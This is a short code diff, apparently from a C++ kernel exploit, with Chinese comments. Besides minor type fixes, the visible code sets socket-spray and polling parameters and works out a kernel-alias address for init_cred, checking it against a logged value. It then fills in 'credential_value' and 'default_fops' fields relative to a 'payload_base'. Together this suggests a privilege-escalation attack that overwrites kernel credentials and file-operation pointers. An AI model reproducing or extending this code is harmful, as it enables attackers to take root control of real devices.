@@ -422,7 +422,7 @@ namespace {
             prepare.geometry.socket_buffer = static_cast<std::int32_t>(report.prepare_socket_buffer);
             prepare.geometry.send_size = static_cast<std::size_t>(report.prepare_send_size);
             prepare.geometry.main_cpu = static_cast<std::int32_t>(report.prepare_main_cpu);
-            prepare.waiting.max_attempts = static_cast<std::size_t>(report.prepare_max_attempts);
+            prepare.waiting.max_attempts = static_cast<std::uint32_t>(report.prepare_max_attempts);
             prepare.waiting.poll_rounds = static_cast<std::size_t>(report.prepare_poll_rounds);
             prepare.page_size = report.prepare_page_size;
             prepare.words = &words_region;
@@ -848,7 +848,8 @@ namespace {
                  * 归档验算：0xffffff8000000000 + 0x2bfd588 + 0x80000000 + 0x28000000 = 0xffffff802abfd588 ✓
                  *   （与日志里 init_cred alias=ffffff802abfd588 完全一致 ✓）。
                  *  此前用 `| 0xffffffc000000000` ✗ ⇒ 基址与两项增量都不对 ✗。 */
-                const std::uint64_t alias_phys_offset = static_cast<std::uint64_t>(phys_offset);
+                [[maybe_unused]] const std::uint64_t alias_phys_offset =
+                        static_cast<std::uint64_t>(phys_offset);   /* 归档验算用的中间值 */
                 layout_inputs.credential_value = static_cast<std::uintptr_t>(
                         kAliasBase + init_cred_image + alias_image_delta);
                 layout_inputs.default_fops = static_cast<std::uintptr_t>(payload_base + page_inputs.slots.fops_table);
